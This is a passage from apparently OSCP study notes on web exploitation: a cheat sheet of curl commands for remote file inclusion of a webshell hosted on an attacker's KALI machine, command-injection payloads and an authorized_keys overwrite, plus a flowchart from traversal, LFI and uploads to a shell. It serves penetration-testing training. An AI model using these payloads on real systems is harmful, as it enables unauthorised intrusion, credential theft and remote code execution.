curl 'http://TARGET/index.php?page=http://KALI/simple-backdoor.php&cmd=id'

# 14. Check Kali webshell collection
ls -la /usr/share/webshells

# 15. Generate SSH key for authorized_keys overwrite
ssh-keygen

# 16. Build authorized_keys from your public key
cat fileup.pub > authorized_keys

# 17. Command-injection POST reproduction
curl -X POST --data 'Archive=git' 'http://TARGET:8000/archive'

# 18. URL-encoded semicolon separator test
curl -X POST --data 'Archive=git%3Bipconfig' 'http://TARGET:8000/archive'
```

## Quick reminders beside the commands

- Linux traversal test: `/etc/passwd`.
- Windows traversal test: `C:\Windows\System32\drivers\etc\hosts`.
- IIS files worth testing: `C:\inetpub\wwwroot\web.config` and IIS log paths.
- Try both `../` and `..\` on Windows-backed applications.
- A file-valued parameter is always worth a traversal/LFI test.
- LFI + writable/poisonable file = potential RCE.
- `php://filter/convert.base64-encode/resource=FILE.php` is a high-value PHP source-disclosure pattern.
- `data://` and RFI usually depend on `allow_url_include`.
- For uploads: test extension case, alternate extensions, rename behavior, exact upload URL, overwrite behavior, and traversal in `filename`.
- If a command with spaces/special characters fails, test URL encoding before assuming the technique is wrong.
- Before firing any reverse shell, start the listener first.
- After shell: immediately establish context (`whoami` / `id`), then continue enumeration rather than assuming you need privesc.

---

# One-Page Mental Model

```text
INPUT CONTROLS A FILE PATH?
        |
        +--> Can read outside web root? --------> DIRECTORY TRAVERSAL
        |          |
        |          +--> /etc/passwd -> users -> .ssh/id_rsa -> SSH
        |          +--> config/source/logs -> credentials
        |
        +--> Is file INCLUDED / executed? ------> LFI
        |          |
        |          +--> poison access.log -> include it -> RCE
        |          +--> php://filter -> PHP source -> credentials
        |          +--> data:// -> inline PHP -> RCE (if enabled)
        |          +--> remote URL accepted? -> RFI -> hosted webshell -> RCE
        |
UPLOAD FEATURE?
        |
        +--> Executable server-side extension? -> upload webshell -> RCE
        |
        +--> Not executable?
                   +--> filename traversal/write outside upload dir
                   +--> overwrite ~/.ssh/authorized_keys -> SSH

INPUT CONTROLS A SYSTEM COMMAND?
        |
        +--> reproduce request in Burp/curl
        +--> find accepted baseline
        +--> test separators + URL encoding
        +--> fingerprint OS/shell
        +--> reverse shell
```

---

## Final OSCP takeaway

For Chapter 9, train yourself to turn every suspicious input into a question:

- **Is this value a path?** → traversal / LFI / RFI.
- **Is this an upload?** → extension, execution, destination, overwrite, traversal.
- **Is this passed to a system utility?** → command injection.
- **Can I read source/configuration?** → credentials.
- **Can I execute one command?** → make it a stable shell.
- **What user is the web process?** → decide whether you already have high privilege or need privesc.

That is the practical bridge from web enumeration to a foothold on an OSCP-style machine.
